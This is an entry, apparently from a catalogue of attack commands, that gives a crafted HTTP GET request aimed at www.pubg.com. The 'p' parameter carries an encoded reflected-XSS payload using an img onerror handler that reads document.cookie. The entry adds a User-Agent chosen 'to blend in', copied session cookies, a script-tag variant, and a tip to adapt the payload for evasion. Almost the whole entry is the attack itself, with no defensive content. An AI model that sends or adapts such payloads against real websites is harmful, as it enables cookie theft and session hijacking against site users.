---
id: cmd-crafted-get-xss-751870
data: >-
  GET
  /?p=iqz78'%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3d1%3echplq
  HTTP/1.1

  Host: www.pubg.com

  Accept-Encoding: gzip, deflate

  Accept: */*

  Accept-Language: en

  User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;
  Trident/5.0)

  Connection: close

  Referer: https://www.pubg.com/es/feed/

  Cookie: _icl_current_language=en; _icl_visitor_lang_js=en-us;
  wpml_browser_redirect_test=0;
  __cfduid=de74423d435717d651b1c9e2c63f4acc21575460678
tags:
  - xss
  - http-request
type: command
output: >-
  The server reflects the injected script, causing the browser to execute the
  alert when the page loads
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:37.966Z'
verified: false
validated: true
submitted: true
---
# crafted-get-request-xss

## Command

```http
GET /?p=iqz78'%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3d1%3echplq HTTP/1.1
Host: www.pubg.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: https://www.pubg.com/es/feed/
Cookie: _icl_current_language=en; _icl_visitor_lang_js=en-us; wpml_browser_redirect_test=0; __cfduid=de74423d435717d651b1c9e2c63f4acc21575460678
```

## Description

This HTTP GET request injects an encoded XSS payload into the 'p' parameter of pubg.com, exploiting the reflected vulnerability to execute JavaScript upon page load.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| p | Vulnerable GET parameter with encoded payload: iqz78'%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3d1%3echplq | Yes |
| Host | Target domain: www.pubg.com | Yes |
| User-Agent | Mimics IE9 browser to blend in | Yes |
| Cookie | Simulates session cookies for authenticity | No |
| Referer | Sets origin to pubg.com/es/feed/ for context | No |

## Examples

### Basic Usage

Send the full request to trigger reflection.

### Advanced Usage

```http
GET /?p=<script>alert(1)</script> HTTP/1.1
Host: www.pubg.com
...
```

Adapt payload for different evasions.

## Expected Output

HTTP 200 response with the page reflecting the payload in HTML, e.g., unsanitized insertion of the <img> tag, leading to onerror execution of alert(document.cookie).

## Related

- [[Related Procedure: Inject-Payload-into-Vulnerable-Parameter]]
